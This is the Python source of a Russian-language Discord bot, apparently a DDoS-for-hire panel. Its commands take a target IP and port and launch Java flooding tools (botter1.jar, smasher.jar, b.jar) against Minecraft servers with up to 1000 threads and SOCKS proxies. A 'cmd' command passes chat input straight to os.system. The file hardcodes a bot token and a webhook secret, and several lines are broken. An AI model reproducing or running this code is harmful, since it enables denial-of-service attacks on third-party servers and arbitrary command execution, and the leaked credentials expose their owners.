import discord
from discord.ext import commands
import os
import threading
import urllib.request
import json
import time
import urllib.request
import json
import os
import psutil
import threading
import asyncio
import random
import logging

token = "OTM0MzQ5ODU2MzA1MjA5Mzg2.YeuzHQ.2M2a3O7PFbQI4TULBc6FWRYL1xw"
ntents = discord.Intents().all()
client = commands.Bot(command_prefix='!!')
client.remove_command('help')
serverid = 934344643661942806
rainbowrolename = "Радужный"
delay = 2
colours = [discord.Color.dark_orange(),discord.Color.orange(),discord.Color.dark_gold(),discord.Color.gold(),discord.Color.dark_magenta(),discord.Color.magenta(),discord.Color.red(),discord.Color.dark_red(),discord.Color.blue(),discord.Color.dark_blue(),discord.Color.teal(),discord.Color.dark_teal(),discord.Color.green(),discord.Color.dark_green(),discord.Color.purple(),discord.Color.dark_purple()]

logger = logging.getlogger()

WEBHOOK_URL = "https://discord.com/api/webhooks/925296397991956491/afn-Bu1F_ks-jrxYcnr2oRii7TfufefIYiHOs4K1yEm0F6MnPsJOESpB83GrRxy1olBl"
handler = discord_logging.Discord_Handler(WEBHOOK_URL)

async def rainbowrole(role):
    for role in client.get_guild(serverid).roles:
        if str(role) == str(rainbowrolename):
            print("Роль обнаружена")
            while not client.is_closed():
                try:
                    await role.edit(color=random.choice(colours))
                except Exception:
                    print("Не могу изменить роль, сделайте чтобы роль бота была выше чем роль " + rainbowrolename + " и проверьте  есть ли право у бота на её изменение")
                    pass
                await asyncio.sleep(delay)
    print('Роль "' + rainbowrolename +'" не была найдена')
    print("Создаю роль...")
    try:
        await client.get_guild(serverid).create_role(reason="Создана РАДУЖНАЯ роль", name=rainbowrolename)
        print("Роль создана!")
        await asyncio.sleep(2)
        client.loop.create_task(rainbowrole(rainbowrolename))
    except Exception as e:
        print("Ой, ошибка! Выдайте боту право на управление ролями.")
        print(e)
        pass
        await asyncio.sleep(10)
        client.loop.create_task(rainbowrole(rainbowrolename))
        
@client.event
async def on_ready():
          await client.change_presence(status=discord.Status.online, activity=discord.Game("!!help - помощь"))
          await asyncio.sleep(5)

@client.command(name="cmd")    
@commands.has_permissions(administrator=True)
async def sendcmd(ctx, *, message):
    try:
        await ctx.send(f'Отправлена команда: {message}')
        os.system(f'{message}')
    except:
        await ctx.send("залупа")

@client.command(name="reload")    
@commands.has_permissions(administrator=True)
async def sendcmd(ctx):
    try:
        await ctx.send(f'**Бот перезагружен**!')
        os.system(f'python index.py')
    except:
        await ctx.send("Епт твою мать бот сдыхает!")

@client.event 
async def on_command_error(ctx, error): 
    if isinstance(error, commands.CommandNotFound): 
        em = discord.Embed(title=f"Ой, ошибка!", description=f"Команда не найдена! Перепроверь, верно ли ты написал", color=ctx.author.color) 
        await ctx.send(embed=em) 
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты указал какой либо аргумент неправильно, перепроверь!", color=ctx.author.color)
        em.add_field(name="Помощь:", value="!!help", inline=True)
        await ctx.send(embed=em) 
    if isinstance(error, commands.MissingRole):
        em = discord.Embed(title=f"Ой, ошибка!", description=f"У тебя нет прав использовать данную команду!", color=ctx.author.color)
        await ctx.send(embed=em)  

@client.command(name="спамбот")
async def spambot(ctx, arg1, *, message):
    if ctx.guild.id == 934344643661942806:
        try:
            ip = f'{arg1}'
            ip1,port = ip.split(':', 1)
            def attack():
                os.system(f"java -Dip={arg1} -Xmx1G -Dmsg='{message}' -jar b.jar")
            embed=discord.Embed(title="Спасибо! Я запустил атаку на этот сервер!", color=0xff0000)
            embed.add_field(name="> Айпи сервера куда атакуем:", value=f"{arg1}", inline=True)
            embed.add_field(name="> Сообщение, которое будут отправлять боты:", value=f"{message}", inline=False)
            embed.set_image(url=f'https://c.tenor.com/hmoSrzzvK7UAAAAC/thanos-snap.gif')
            embed.set_footer(text="Megahack")
            await ctx.send(embed=embed)
            t1 = threading.Thread(target=attack)
            t1.start()
            time.sleep(70)
            os.system('pkill java')
            em1=discord.Embed(title="Атака остановлена, спасибо", color=0xc720f2)
            em1.add_field(name="Возможно, пока происходила эта атака были еще запросы на DDoS, поэтому я запускаю их(если они есть)", inline=False)
            em1.set_footer(text="M_E_Z_K_A")
            await ctx.send(embed=em1)                    
        except:
            em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты неверно указал аргументы, перепроверь как ты написал команду", color=ctx.author.color)
            em.add_field(name="Помощь:", value="!!help", inline=True)
            await ctx.send(embed=em) 	
    else:
        em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты не в дс сервере.", color=ctx.author.color)
        em.add_field(name="Сервер:", value="https://discord.gg/canjqF4AKH", inline=True)
        await ctx.send(embed=em)

@client.command(name="load")
@commands.has_permissions(administrator=True)
async def stats(ctx):
    bedem = discord.Embed(title = 'System Resource Usage', description = 'Bot load')
    bedem.add_field(name = 'CPU Usage', value = f'{psutil.cpu_percent()}%', inline = False)
    bedem.add_field(name = 'Memory Usage', value = f'{psutil.virtual_memory().percent}%', inline = False)
    bedem.add_field(name = 'Available Memory', value = f'{psutil.virtual_memory().available * 100 / psutil.virtual_memory().total}%', inline = False)
    await ctx.send(embed = bedem)

@client.command(name="пинг")
async def nullping(ctx, arg1):
    if ctx.guild.id == 934344643661942806:   
        try:
            ip = f'{arg1}'
            ip1,port = ip.split(':', 1)
            def attack():
                os.system(
                        
                    f"java -jar botter1.jar host-{ip1} port-{port} threads-1000")
            embed=discord.Embed(title="Cпасибо! Я запустил атаку на этот сервер", color=0xff0000)
            embed.add_field(name="Айпи:", value=f"{ip1}:{port}", inline=True)
            embed.set_image(url=f'https://c.tenor.com/hmoSrzzvK7UAAAAC/thanos-snap.gif')
            embed.set_footer(text="Megahack")
            await ctx.send(embed=embed)
            t1 = threading.Thread(target=attack)
            t1.start()
            time.sleep(90)
            os.system('pkill java')
            em1=discord.Embed(title="Атака остановлена, спасибо", color=0xc720f2)
            em1.add_field(name="Возможно, пока происходила эта атака были еще запросы на DDoS, поэтому я запускаю их(если они есть)", inline=False)
            em1.set_footer(text="M_E_Z_K_A")
            await ctx.send(embed=em1)                    
        except:
            em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты неверно указал аргументы, перепроверь как ты написал команду", color=ctx.author.color)
            em.add_field(name="Помощь:", value="!!help", inline=True)
            await ctx.send(embed=em) 
    else:
        em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты не в дс сервере.", color=ctx.author.color)
        em.add_field(name="Сервер:", value="https://discord.gg/canjqF4AKH", inline=True)
        await ctx.send(embed=em)

@client.command(name="смеш")
async def nullping(ctx, arg1):
    if ctx.guild.id == 934344643661942806:   
        try:
            ip = f'{arg1}'
            ip1,port = ip.split(':', 1)
            def attack():
                os.system(
                        
                    f"java -jar smasher.jar host-{ip1} port-{port} file-proxies.txt proxymode-socks threads-250 loop-8 debug-true time-90")
            embed=discord.Embed(title="Cпасибо! Я запустил атаку на этот сервер", color=0xff0000)
            embed.add_field(name="Айпи:", value=f"{ip1}:{port}", inline=True)
            embed.set_image(url=f'https://c.tenor.com/hmoSrzzvK7UAAAAC/thanos-snap.gif')
            embed.set_footer(text="Megahack")
            await ctx.send(embed=embed)
            t1 = threading.Thread(target=attack)
            t1.start()
            time.sleep(90)
            os.system('pkill java')
            em1=discord.Embed(title="Атака остановлена, спасибо", color=0xc720f2)
            em1.add_field(name="Возможно, пока происходила эта атака были еще запросы на DDoS, поэтому я запускаю их(если они есть)", inline=False)
            em1.set_footer(text="M_E_Z_K_A")
            await ctx.send(embed=em1)                    
        except:
            em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты неверно указал аргументы, перепроверь как ты написал команду", color=ctx.author.color)
            em.add_field(name="Помощь:", value="!!help", inline=True)
            await ctx.send(embed=em) 
    else:
        em = discord.Embed(title=f"Ой, ошибка!", description=f"Ты не в дс сервере.", color=ctx.author.color)
        em.add_field(name="Сервер:", value="https://discord.gg/canjqF4AKH", inline=True)
        await ctx.send(embed=em)

@client.command()
async def help(ctx):
    emb=discord.Embed(title="> Мои команды:", color=0x7CFC00)
    emb.add_field(name="> Запустить атаку на сервер:", value="> !!пинг IP:PORT версия", inline=False)
    emb.add_field(name="> Запустить спам-ботов на сервер", value="> !! спамбот IP:PORT текст", inline=False)
    emb.add_field(name="> Запустить смешанную атаку на сервер", value="> !! смеш IP:PORT", inline=False)
    emb.add_field(name="> Узнать цифровой айпи о сервере", value="> !! resolve Домен", inline=False)
    await ctx.send(embed=emb)
        
@client.command(name='resolve')        
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Успешно!",
        color=discord.Colour.red()
    )
    if json_object["online"] == "True":
        status = "Выключен / не могу получить данные"
        embed.add_field(name='Айпи:', value=json_object["ip"], inline=True)
        embed.add_field(name='Порт:', value=json_object["port"], inline=True)
        embed.add_field(name="Хост:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Статус сервера:", value=f"{status}", inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="Megahack")
        await ctx.send(embed=embed)
    else:
        statas = "Включён"
        embed.add_field(name='Айпи:', value=json_object["ip"], inline=True)
        embed.add_field(name='Порт:', value=json_object["port"], inline=True)
        embed.add_field(name="Хост:", value=json_object["hostname"], inline=True)
        embed.add_field(name="Статус сервера:", value=statas, inline=True)

        g = json_object["ip"]
        gb = json_object["port"]

        embed.set_footer(text="M_E_Z_K_A")
        await ctx.send(embed=embed)


client.run(token)
